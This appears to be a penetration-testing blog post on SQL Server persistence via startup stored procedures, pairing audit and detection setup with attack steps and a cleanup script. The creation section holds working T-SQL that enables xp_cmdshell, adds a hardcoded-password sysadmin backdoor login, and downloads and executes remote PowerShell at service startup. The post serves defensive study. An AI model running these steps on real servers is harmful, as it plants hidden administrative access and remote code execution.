      <p>During red team and penetration test engagements, one common goal is to maintain access to target environments while security teams attempt to identify and remove persistence methods. There are many ways to maintain persistent access to Windows environments. However, detective controls tend to focus on compromised account identification and persistence methods at the operating system layer. While prioritizing detective control development in those areas is a good practice, common database persistence methods are often overlooked.</p>
<p>In this blog series, I&#8217;m planning to take a look at few techniques for maintaining access through SQL Server and how they can be detected by internal security teams. Hopefully they will be interesting to both red and blue teams.</p>
<p>Below is an overview of what will be covered in this blog:</p>

<h3 id="why">Why use SQL Server as a Persistence Method?</h3>
<p>It may not be immediately obvious why anyone would use SQL Server or other database platforms to maintain access to an environment, so I&#8217;ve provided some of the advantages below.</p>
<ol>
<li>The .mdf files that SQL Server uses to store data and other objects such as stored procedures are constantly changing, so there is no easy way to use File Integrity Monitoring (FIM) to identify database layer persistence methods.</li>
<li>SQL Server persistence methods that interact with the operating systems will do so under the context of the associated SQL Server service account. This helps make potentially malicious actions appear more legitimate.</li>
<li>It&#8217;s very common to find SQL Server service accounts configured with local administrative or LocalSystem privileges. This means that in most cases any command and control code running from SQL Server will have local administrative privileges.</li>
<li>Very few databases are configured to audit for common Indicators of Compromise (IoC) and persistence methods.</li>
</ol>
<p>With that out of the way, let&#8217;s learn a little about stored procedures.</p>
<h3 id="intro">Introduction to Startup Stored Procedures</h3>
<p>In SQL Server, stored procedures are basically chunks of SQL code intended for reuse that get compiled into a single execution plan. Similar to functions, they can accept parameters and provide output to the user. SQL Server ships with quite a few native stored procedures, but they can also be user defined. Once logged into SQL Server, it&#8217;s possible to execute stored procedures that the current user has privileges to execute. For more general information regarding stored procedures, visit <a href="https://technet.microsoft.com/en-us/library/aa174792(v=sql.80).aspx" target="_blank" rel="noopener noreferrer">https://technet.microsoft.com/en-us/library/aa174792(v=sql.80).aspx</a>.</p>
<p>The native sp_procoption stored procedure can be used to configure user defined stored procedures to run when SQL Server is started or restarted. The general idea is very similar to the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa376977(v=vs.85).aspx" target="_blank" rel="noopener noreferrer">&#8220;run&#8221; and &#8220;run once&#8221; registry keys</a> commonly used for persistence by developers, malware, and penetration testers. Before we get started on creating our evil startup stored procedures there are a few things to be aware of.</p>
<p>The stored procedures configured for automatic execution at start time:</p>
<ul>
<li>Must exist in the Master database</li>
<li>Cannot accept INPUT or OUTPUT parameters</li>
<li>Must be marked for automatic execution by a sysadmin</li>
</ul>
<p><b>General Note</b>: Based on my time playing with this in a lab environment, all startup stored procedures are run under the context of the sa login, regardless of what login was used to flag the stored procedure for automatic execution. Even if the sa login is disabled, the startup procedures will still run under the sa context when the service is restarted.</p>
<h3 id="detection">Startup Stored Procedure Detection</h3>
<p>In this section I&#8217;ve provided an example script that can be used to enable audit features in SQL Server that will log potentially malicious startup procedure activities to the Windows Application event log.</p>
<p>Normally I would introduce the attack setup first, but if the audit controls are not enabled ahead of time the events we use to detect the attack won&#8217;t show up in the Windows application event log.</p>
<p><b>Important Note</b>: Be aware that the sysadmin privileges are required to run the script, and recommendations in this section will not work on SQL Server Express, because SQL Server Auditing is a commercial feature. SQL Server Auditing can be used to monitor all kinds of database activity. For those who are interested in learning more I recommend checking out this Microsoft site. <a href="https://technet.microsoft.com/en-us/library/cc280386(v=sql.110).aspx" target="_blank" rel="noopener noreferrer">https://technet.microsoft.com/en-us/library/cc280386(v=sql.110).aspx</a></p>
<p><b>Audit Setup Instructions</b><br />
Follow the instructions below to enable auditing:</p>
<ol>
<li>Create and enable a SERVER AUDIT.
<pre class="EnlighterJSRAW" data-enlighter-language="generic">-- Select master database
USE master

-- Setup server audit to log to application log
CREATE SERVER AUDIT Audit_StartUp_Procs
TO APPLICATION_LOG
WITH (QUEUE_DELAY = 1000, ON_FAILURE = CONTINUE)

-- Enable server audit
ALTER SERVER AUDIT Audit_StartUp_Procs
WITH (STATE = ON)</pre>
</li>
<li>Create an enabled SERVER AUDIT SPECIFICATION. This will enable auditing of defined server level events. In this example, it&#8217;s been configured to monitor group changes, server setting changes, and audit setting changes.
<pre class="EnlighterJSRAW" data-enlighter-language="generic">-- Create server audit specification
CREATE SERVER AUDIT SPECIFICATION Audit_StartUp_Procs_Server_Spec
FOR SERVER AUDIT Audit_StartUp_Procs
ADD (SERVER_ROLE_MEMBER_CHANGE_GROUP), 

-- track group changes
ADD (SERVER_OPERATION_GROUP), 

-- track server setting changes
ADD (AUDIT_CHANGE_GROUP) 

-- track audit setting changes
WITH (STATE = ON)</pre>
</li>
<li>Create an enabled DATABASE AUDIT SPECIFICATION. This will enable auditing of specific database level events. In this case, the execution of the sp_procoption procedure will be monitored.
<pre class="EnlighterJSRAW" data-enlighter-language="generic">-- Create the database audit specification
CREATE DATABASE AUDIT SPECIFICATION Audit_StartUp_Procs_Database_Spec
FOR SERVER AUDIT Audit_StartUp_Procs
ADD (EXECUTE
ON master..sp_procoption BY public ) 

-- sp_procoption execution
WITH (STATE = ON)
GO</pre>
</li>
<li>All enabled server and database level audit specifications can be viewed with the queries below. Typically, sysadmin privileges are required to view them.
<pre class="EnlighterJSRAW" data-enlighter-language="generic">-- List enabled server specifications
SELECT		audit_id, 
        a.name as audit_name, 
        s.name as server_specification_name,
        d.audit_action_name,
        s.is_state_enabled,
        d.is_group,
        d.audit_action_id,	
        s.create_date,
        s.modify_date
FROM sys.server_audits AS a
JOIN sys.server_audit_specifications AS s
ON a.audit_guid = s.audit_guid
JOIN sys.server_audit_specification_details AS d
ON s.server_specification_id = d.server_specification_id
WHERE s.is_state_enabled = 1

-- List enabled database specifications
SELECT	a.audit_id,
        a.name as audit_name,
        s.name as database_specification_name,
        d.audit_action_name,
        s.is_state_enabled,
        d.is_group,
        s.create_date,
        s.modify_date,
        d.audited_result
FROM sys.server_audits AS a
JOIN sys.database_audit_specifications AS s
ON a.audit_guid = s.audit_guid
JOIN sys.database_audit_specification_details AS d
ON s.database_specification_id = d.database_specification_id
WHERE s.is_state_enabled = 1</pre>
<p>If you&#8217;re interested in finding out about other server and database audit options, you can get a full list using the query below.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Select DISTINCT action_id,name,class_desc,parent_class_desc,containing_group_name from sys.dm_audit_actions order by parent_class_desc,containing_group_name,name</pre>
<pre class="lang:mysql decode:true "></pre>
</li>
</ol>
<h3 id="creation">Startup Stored Procedure Creation</h3>
<p>Now for the fun part. The code examples provided in this section will create two stored procedures and configure them for automatic execution. As a result, the stored procedures will run the next time a patch is applied to SQL Server, or the server is restarted. As mentioned before, sysadmin privileges will be required.</p>
<p><b>Note</b>: This example was performed over a direct database connection, but could potentially be executed through SQL injection as well.</p>
<ol>
<li>If you&#8217;re trying this out at home, you can download and install SQL Server with SQL Server Management Studio Express to use for connecting to the remote SQL Server. <a href="https://www.microsoft.com/en-us/download/details.aspx?id=42299" target="_blank" rel="noopener noreferrer">https://www.microsoft.com/en-us/download/details.aspx?id=42299</a>.</li>
<li>Log into the (commercial version of) SQL Server with sysadmin privileges.</li>
<li>Enable the xp_cmdshell stored procedure. This may not be required, but xp_cmdshell is disabled by default.
<pre class="EnlighterJSRAW" data-enlighter-language="generic">-- Enabled xp_cmdshell
sp_configure 'show advanced options',1
RECONFIGURE
GO

sp_configure 'xp_cmdshell',1
RECONFIGURE
GO</pre>
<p>When a system setting like &#8220;xp_cmdshell&#8221; is changed, the Windows Application event log should include event ID 15457. Also, event ID 33205 should show up with a statement field set to &#8220;reconfigure&#8221;. I don&#8217;t see xp_cmdshell enabled very often. So most attackers will have to enable it to perform OS level operations.</p>
<p><img fetchpriority="high" decoding="async" class="alignnone size-full wp-image-6095" src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_1.png" alt="" width="1018" height="721" /></li>
<li>Create a stored procedure to add a new sysadmin Login using the query below.
<pre class="EnlighterJSRAW" data-enlighter-language="generic">------------------------------
-- Create a stored procedure 1
------------------------------
USE MASTER
GO

CREATE PROCEDURE sp_add_backdoor_account
AS

-- create sql server login backdoor_account
CREATE LOGIN backdoor_account WITH PASSWORD = 'Password123!';

-- Add backdoor_account to sysadmin fixed server role
EXEC sp_addsrvrolemember 'backdoor_account', 'sysadmin';

GO</pre>
</li>
<li>Create a stored procedure to use the xp_cmdshell stored procedure to download and execute a PowerShell payload from the internet using the query below. The script in the example simply writes a c:\temp\helloworld.txt file, but you can use any PowerShell payload. Something like a<a href="https://www.powershellempire.com/"> PowerShell Empire</a> agent could be handy.
<pre class="EnlighterJSRAW" data-enlighter-language="generic">------------------------------
-- Create a stored procedure 2
------------------------------
USE MASTER
GO

CREATE PROCEDURE sp_add_backdoor
AS
-- Download and execute PowerShell code from the internet
EXEC master..xp_cmdshell 'powershell -C "Invoke-Expression (new-object System.Net.WebClient).DownloadString(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1'')"'
GO</pre>
</li>
<li>Configure the stored procedures to run when the SQL Server service is restarted using the query below.
<pre class="EnlighterJSRAW" data-enlighter-language="generic">------------------------------------------------
-- Configure stored procedure to run at startup
------------------------------------------------
-- Set 'sp_add_backdoor_account' to auto run
EXEC sp_procoption @ProcName = 'sp_add_backdoor_account',
@OptionName = 'startup',
@OptionValue = 'on';

-- Setup 'sp_add_backdoor' to auto run
EXEC sp_procoption @ProcName = 'sp_add_backdoor',
@OptionName = 'startup',
@OptionValue = 'on';</pre>
<p>After execution, the event ID 33205 should show up in the Windows Application event log if auditing has been enabled. The &#8220;object_name&#8221; should contain &#8220;sp_procoption&#8221;, and the name of the startup stored procedure can be found in the &#8220;statement&#8221; field. I haven&#8217;t seen this option used very often in production environments. So alerting on it shouldn&#8217;t generate too many false positives. Below is an example of the event output.</li>
<li><img decoding="async" class="alignnone wp-image-24023 size-full" src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_2-1024x726-1.png" alt="" width="1024" height="726" srcset="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_2-1024x726-1.png 1024w, https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_2-1024x726-1-300x213.png 300w, https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_2-1024x726-1-768x545.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" /></li>
<li>Confirm the configuration worked using the query below.
<pre class="EnlighterJSRAW" data-enlighter-language="generic">-- List stored procedures mark for automatic execution
SELECT [name] FROM sysobjects
WHERE type = 'P'
AND OBJECTPROPERTY(id, 'ExecIsStartUp') = 1;</pre>
</li>
<li>If you&#8217;re doing this lab on a test instance on your own system, then you can restart the SQL Server service. If you&#8217;re performing an actual penetration test, you&#8217;ll have to wait for the service or server to restart before the procedures are executed. Usually that will happen during standard patch cycles. So if you&#8217;re procedures start a reverse shell you may have to wait a while.<strong>Very Important Note</strong>: Only perform this step in a lab environment and NEVER restart a production service. Unless of course you want to be attacked by an angry mob of DBAs and business line owners. That being said, you can restart the service with the sc or the PowerShell restart-service commands. However, if you&#8217;re a GUI fan you can just use services.msc as shown below.<img decoding="async" class="alignnone size-full wp-image-6097" src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_3.png" alt="" width="816" height="600" />When the SQL Server service restarts it will launch the startup procedures and Windows event ID 17135 is used to track that event as shown below.</li>

<h3 id="review">Startup Stored Procedure Code Review</h3>
<p>At this point you should be able to view the log entries described earlier (33205 and 17135). They should tell you what procedures to dig into. If you&#8217;re interested in what they&#8217;re doing, it&#8217;s possible to view the source code for all startup stored procedures with the query below.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SELECT ROUTINE_NAME, ROUTINE_DEFINITION
FROM MASTER.INFORMATION_SCHEMA.ROUTINES
WHERE OBJECTPROPERTY(OBJECT_ID(ROUTINE_NAME),'ExecIsStartup') = 1</pre>
<p>Be aware that you will need privileges to view them, but as a sysadmin it shouldn&#8217;t be an issue.</p>
<h3 id="removal">Startup Stored Procedure Removal</h3>
<p>My guess is that at some point you&#8217;ll want to remove your sample startup procedures and audit settings, so below is a removal script.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">-- Disable xp_cmdshell
sp_configure 'xp_cmdshell',0
reconfigure
go

sp_configure 'show advanced options',0
reconfigure
go

--Stop stored procedures from starting up
EXEC sp_procoption @ProcName = 'sp_add_backdoor',
@OptionName = 'startup',
@OptionValue = 'off';

EXEC sp_procoption @ProcName = 'sp_add_backdoor_account',
@OptionName = 'startup',
@OptionValue = 'off';

-- Remove stored procedures
DROP PROCEDURE sp_add_backdoor
DROP PROCEDURE sp_add_backdoor_account

-- Disable and remove SERVER AUDIT
ALTER SERVER AUDIT Audit_StartUp_Procs
WITH (STATE = OFF)
DROP SERVER AUDIT Audit_StartUp_Procs

-- Disable and remove SERVER AUDIT SPECIFICATION
ALTER SERVER AUDIT SPECIFICATION Audit_StartUp_Procs_Server_Spec
WITH (STATE = OFF)
DROP SERVER AUDIT SPECIFICATION Audit_StartUp_Procs_Server_Spec

-- Disable and remove DATABASE AUDIT SPECIFICATION
ALTER DATABASE AUDIT SPECIFICATION Audit_StartUp_Procs_Database_Spec
WITH (STATE = OFF)
DROP DATABASE AUDIT SPECIFICATION Audit_StartUp_Procs_Database_Spec</pre>
<pre class="lang:tsql decode:true"></pre>
<p><strong>So&#8230;</strong><br />
If an attacker decides to be clever and disable the audit settings it will also show up under event ID 33205. In this case, the statement will include &#8220;ALTER SERVER AUDIT&#8221; or &#8220;DROP SERVER AUDIT&#8221; along with the rest of the statement. Also, &#8220;object_name&#8221; will be the name of the SERVER AUDIT. This is another thing that shouldn&#8217;t change very often in production environments so it&#8217;s a good this to watch. Below is a basic screenshot example.</p>

<h3>Wrap Up</h3>
<p>In this blog I covered how to create, detect, and remove malicious startup stored procedures in SQL Server. Hopefully, this will help create some awareness around this type of persistence method.
